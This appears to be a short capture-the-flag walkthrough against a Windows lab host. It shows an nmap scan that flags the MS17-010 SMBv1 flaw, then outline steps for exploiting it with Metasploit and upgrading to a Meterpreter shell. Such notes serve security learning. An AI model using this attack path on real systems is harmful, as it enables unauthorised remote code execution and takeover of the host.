=== Recon

export IP=<IP>

==> nmap scan
nmap -sV -v --script vuln $IP

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
Initiating NSE at 10:20
Completed NSE at 10:20, 0.00s elapsed
Initiating NSE at 10:20
Completed NSE at 10:20, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.41 seconds
           Raw packets sent: 1092 (48.024KB) | Rcvd: 1089 (43.588KB)


=== Gain Access
-> start metasploit (cmd: msfconsole)

search for ms17-010 exploits
cmd: search ms17-010

set required options, set payload as mentioned and run the exploit (ctrl -Z to background the shell/terminal)


=== Escalate
Search shell_to_meterpreter exploit and use the "post/multi/manage/shell_to_meterpreter"

set required options


